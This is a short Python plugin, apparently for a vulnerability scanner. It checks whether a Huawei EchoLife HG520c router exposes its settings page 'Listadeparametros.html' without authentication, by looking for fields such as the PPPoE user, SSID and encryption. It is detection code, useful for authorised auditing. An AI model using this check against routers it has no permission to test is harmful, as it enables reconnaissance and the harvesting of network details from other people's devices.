#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'K0thony'
# HUAWEI ECHOLIFE HG520c Revelacion de Informacion

import re
import urlparse

def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(arg):
    url = arg + 'Listadeparametros.html'
    keywords = ('ip',
               'model',
               'pppoe_user',
               'dns1',
               'network_segment',
               'active_ethernet',
               'active_wireless',
               'ssid',
               'geteway',
               'firmware_version',
               'encryption')
    code, head, res, body, _ = curl.curl(url)
    if code == 200:
        flag=False
        for i in range(len(keywords)):
            if keywords[i] not in res:
                flag=True
                break#只要有一个key不在里面就不存在漏洞
        if flag==False:
            security_hole('HUAWEI ECHOLIFE HG520c Revelacion de Informacion in %s' % url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://www.example.com/')[1])